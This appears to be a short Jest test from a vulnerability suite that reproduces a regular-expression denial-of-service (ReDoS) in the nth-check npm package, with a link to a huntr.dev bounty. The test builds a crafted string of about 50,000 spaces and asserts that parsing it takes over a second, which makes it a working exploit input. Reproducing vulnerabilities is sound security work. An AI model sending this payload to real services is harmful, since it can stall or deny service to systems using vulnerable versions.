//https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0/
test("ReDos in nth-check", () => {
  const measureTime = require("../utils").measureTime;
  const nthCheck = require("nth-check");

  let attack_str = "2n" + " ".repeat(50000) + "!";

  let t = measureTime(function () {
    try {
      nthCheck.parse(attack_str);
    } catch (e) {}
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
